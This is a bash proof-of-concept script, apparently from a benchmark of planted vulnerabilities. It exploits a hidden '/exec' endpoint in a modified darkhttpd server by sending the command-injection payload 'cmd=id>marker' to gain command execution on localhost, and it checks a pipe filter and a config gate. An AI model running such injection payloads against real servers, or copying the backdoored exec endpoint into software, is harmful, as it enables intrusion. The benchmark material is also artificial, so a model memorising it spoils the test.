#!/usr/bin/env bash
# PoC for 121_darkhttpd_C3I2S2
# Axes: C3 (config file + runtime state) / I2 (snprintf buffered) / S2 (pipe blocked, bypass: semicolon)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/darkhttpd"
WWWROOT="/tmp/poc_121_www"
MARKER="/tmp/poc_121_marker"
CONF="/tmp/poc_121.conf"
CONF_NEG="/tmp/poc_121_neg.conf"
PORT=18121

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" "$CONF_NEG"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create config file
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# Start server WITH config file
echo "[*] starting darkhttpd with --config on port $PORT..."
"$BINARY" "$WWWROOT" --port "$PORT" --config "$CONF" --log /dev/null &
SERVER_PID=$!
sleep 0.4

# Step 1: initialize the exec gate
echo "[*] step 1: calling /exec/init?token=s3cr3t..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null

# Step 2: exploit using semicolon (S2 bypass — pipe is blocked)
echo "[*] step 2: sending payload (S2 bypass via semicolon): cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Verify S2 blocks pipe
echo "[*] verifying S2: pipe should be blocked..."
PIPE_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:${PORT}/exec?cmd=id|cat" || echo "000")
if [[ "$PIPE_CODE" == "403" ]]; then
    echo "[+] S2 check passed: pipe blocked with 403"
else
    echo "[!] S2 check: got $PIPE_CODE"
fi

# Negative control: config with exec_mode=0
echo "[*] verifying gate: endpoint must be absent with exec_mode=0..."
cat > "$CONF_NEG" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF
NEG_PID=0
"$BINARY" "$WWWROOT" --port $((PORT+1000)) --config "$CONF_NEG" --log /dev/null &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$((PORT+1000))/exec?cmd=id" || echo "000")
kill "$NEG_PID"; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 with exec_mode=0"
else
    echo "[!] gate check: got $HTTP_CODE"
fi
